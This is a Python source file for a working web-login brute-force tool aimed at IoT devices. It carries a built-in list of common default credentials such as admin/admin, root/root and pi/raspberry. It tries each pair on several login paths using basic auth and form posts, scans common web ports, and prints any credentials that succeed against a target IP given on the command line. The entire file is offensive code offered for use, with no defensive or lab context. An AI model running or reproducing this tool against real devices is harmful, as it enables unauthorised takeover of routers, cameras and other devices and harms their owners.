#!/usr/bin/env python3
"""web_bruteforce.py

Simple web login brute force module for common IoT device credentials.
"""

import logging
import time
from typing import List, Dict, Optional, Tuple

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

logger = logging.getLogger("web_bruteforce")

# Set default logging level
if not logger.handlers:
    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)-5s: %(message)s"))
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)

# Common IoT device credentials
DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("root", "root"),
    ("root", "admin"),
    ("root", ""),
    ("user", "user"),
    ("guest", "guest"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("ubnt", "ubnt"),  # Ubiquiti
    ("pi", "raspberry"),  # Raspberry Pi
]

def try_web_login(ip: str, port: int, username: str, password: str, timeout: int = 5) -> bool:
    """Try to login to web interface with given credentials."""
    if not REQUESTS_AVAILABLE:
        return False
    
    base_url = f"http://{ip}:{port}"
    session = requests.Session()
    
    try:
        # Common login endpoints
        login_paths = ["/login", "/", "/admin", "/cgi-bin/login"]
        
        for path in login_paths:
            try:
                # Try GET first to get login page
                response = session.get(f"{base_url}{path}", timeout=timeout)
                if response.status_code != 200:
                    continue
                
                # Try basic auth first
                auth_response = session.get(f"{base_url}{path}", 
                                          auth=(username, password), 
                                          timeout=timeout)
                if auth_response.status_code == 200 and "login" not in auth_response.text.lower():
                    return True
                
                # Try form-based login
                login_data = {
                    "username": username, "password": password,
                    "user": username, "pass": password,
                    "login": "Login", "submit": "Login"
                }
                
                post_response = session.post(f"{base_url}{path}", 
                                           data=login_data, 
                                           timeout=timeout)
                
                # Check for successful login indicators
                success_indicators = ["dashboard", "home", "main", "index", "welcome"]
                fail_indicators = ["invalid", "error", "failed", "incorrect", "login"]
                
                response_text = post_response.text.lower()
                
                if any(indicator in response_text for indicator in success_indicators):
                    if not any(indicator in response_text for indicator in fail_indicators):
                        return True
                        
            except Exception as e:
                logger.debug(f"Login attempt failed for {path}: {e}")
                continue
                
    except Exception as e:
        logger.debug(f"Web login failed for {ip}:{port} - {e}")
    
    return False

def brute_force_web_login(ip: str, port: int, credentials: Optional[List[Tuple[str, str]]] = None) -> Optional[Tuple[str, str]]:
    """Brute force web login for a given IP and port."""
    if not REQUESTS_AVAILABLE:
        logger.debug("requests not available for web brute force")
        return None
    
    if credentials is None:
        credentials = DEFAULT_CREDENTIALS
    
    logger.info(f"Attempting web login brute force on {ip}:{port}")
    
    for username, password in credentials:
        logger.debug(f"Trying {username}:{password} on {ip}:{port}")
        
        if try_web_login(ip, port, username, password):
            logger.warning(f"SUCCESS: {ip}:{port} - {username}:{password}")
            return (username, password)
        
        time.sleep(0.5)  # Delay between attempts
    
    logger.info(f"No valid credentials found for {ip}:{port}")
    return None

def scan_web_ports(ip: str, ports: List[int]) -> Dict[int, Optional[Tuple[str, str]]]:
    """Scan multiple web ports for weak credentials."""
    results = {}
    web_ports = [p for p in ports if p in [80, 443, 8080, 8443, 8000, 8888, 9000]]
    
    if not web_ports:
        return results
    
    for port in web_ports:
        try:
            creds = brute_force_web_login(ip, port)
            results[port] = creds
        except Exception as e:
            logger.debug(f"Web brute force failed for {ip}:{port} - {e}")
            results[port] = None
    
    return results

if __name__ == "__main__":
    import sys
    import argparse
    
    # Setup logging for standalone use
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)-5s: %(message)s")
    
    parser = argparse.ArgumentParser(description="Web login brute force tool")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()
    
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Test single port
    result = brute_force_web_login(args.ip, args.port)
    if result:
        print(f"SUCCESS: {args.ip}:{args.port} - {result[0]}:{result[1]}")
    else:
        print(f"No valid credentials found for {args.ip}:{args.port}")